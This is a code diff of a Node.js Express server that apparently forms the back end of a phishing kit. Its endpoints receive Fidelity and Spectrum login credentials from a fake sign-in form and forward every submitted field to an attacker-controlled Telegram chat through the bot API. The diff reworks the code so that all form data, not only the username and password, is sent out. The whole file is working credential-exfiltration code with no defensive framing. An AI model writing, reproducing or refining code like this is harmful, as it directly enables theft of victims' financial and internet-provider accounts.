@@ -1,69 +1,82 @@
-import dotenv from "dotenv";
-dotenv.config();
-
-const express = require("express");
-const bodyParser = require("body-parser");
-const fetch = require("node-fetch");
+import express from "express";
+import fetch from "node-fetch"; // or use global fetch in Node 18+
 
 const app = express();
-const PORT = process.env.PORT || 3000;
+app.use(express.json());
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
-app.use(bodyParser.json());
-app.use(express.static("public")); // Serve static files (like the HTML form)
-
-async function sendTelegramMessage(message) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  const payload = {
-    chat_id: CHAT_ID,
-    text: message,
-    parse_mode: "Markdown",
-  };
-
-  try {
-    const response = await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
-    return response.json();
-  } catch (error) {
-    console.error("Error sending message to Telegram:", error);
-  }
+if (!BOT_TOKEN || !CHAT_ID) {
+  console.error("BOT_TOKEN and CHAT_ID must be set as environment variables");
+  process.exit(1);
 }
 
-// Fidelity Login Endpoint
+// Helper function to send message to Telegram
+async function sendTelegramMessage(message) {
+  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message,
+    }),
+  });
+
+  return response.json();
+}
+
+// Endpoint for Fidelity login data
 app.post("/send-login", async (req, res) => {
-  const { username, password, remember } = req.body;
+  const data = req.body;
 
-  const message = `
-*Fidelity Login Credentials:*
-- Username: \`${username}\`
-- Password: \`${password}\`
-- Remember Username: ${remember ? "Yes" : "No"}
-  `;
+  let message = "🔐 Fidelity Login Attempt\n";
 
-  await sendTelegramMessage(message);
-  res.sendStatus(200);
+  for (const [key, value] of Object.entries(data)) {
+    message += `• ${key}: ${value}\n`;
+  }
+
+  try {
+    const result = await sendTelegramMessage(message);
+
+    if (!result.ok) {
+      console.error("Telegram API error:", result);
+      return res.status(500).json({ error: "Failed to send message" });
+    }
+
+    res.json({ success: true });
+  } catch (error) {
+    console.error("Error sending message:", error);
+    res.status(500).json({ error: "Error sending message" });
+  }
 });
 
-// Spectrum Login Endpoint (changed variable names to match sketch)
+// Endpoint for Spectrum login data
 app.post("/send-spectrum-login", async (req, res) => {
-  const { spectrumUsername, spectrumPassword, staySignedIn } = req.body;
+  const data = req.body;
 
-  const message = `
-*Spectrum Login Credentials:*
-- Username: \`${spectrumUsername}\`
-- Password: \`${spectrumPassword}\`
-- Stay Signed In: ${staySignedIn ? "Yes" : "No"}
-  `;
+  let message = "📶 Spectrum Login Attempt\n";
 
-  await sendTelegramMessage(message);
-  res.sendStatus(200);
+  for (const [key, value] of Object.entries(data)) {
+    message += `• ${key}: ${value}\n`;
+  }
+
+  try {
+    const result = await sendTelegramMessage(message);
+
+    if (!result.ok) {
+      console.error("Telegram API error:", result);
+      return res.status(500).json({ error: "Failed to send message" });
+    }
+
+    res.json({ success: true });
+  } catch (error) {
+    console.error("Error sending message:", error);
+    res.status(500).json({ error: "Error sending message" });
+  }
 });
 
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+const port = process.env.PORT || 3000;
+app.listen(port, () => {
+  console.log(`Server listening on port ${port}`);
 });
